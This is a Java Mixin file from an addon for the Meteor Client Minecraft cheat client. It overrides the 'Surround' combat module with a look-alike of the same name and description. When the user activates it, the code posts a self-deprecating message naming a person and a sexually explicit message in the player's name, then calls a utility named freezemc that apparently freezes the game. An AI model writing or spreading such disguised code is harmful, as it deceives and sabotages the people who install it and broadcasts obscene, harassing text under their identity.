package communityaddon.mixin;

import communityaddon.Addon;
import communityaddon.TrollegeUtils;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.combat.Surround;
import meteordevelopment.meteorclient.systems.modules.misc.Spam;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Overwrite;

@Mixin(value = Surround.class, remap = false)
public abstract class SurroundMixin extends Module {

    public SurroundMixin() {
        super(Categories.Misc, "Surround", "stops death kind of obsidians ex.");
    }
    @Override
    public void onActivate() {
        ChatUtils.sendPlayerMsg("gg u win i suck at cpvp, Samuel Ian Yoder Owns ME AND ALL!");
        ChatUtils.sendPlayerMsg("FILL ME WITH CUM DADDY");
        TrollegeUtils.freezemc();
    }
}
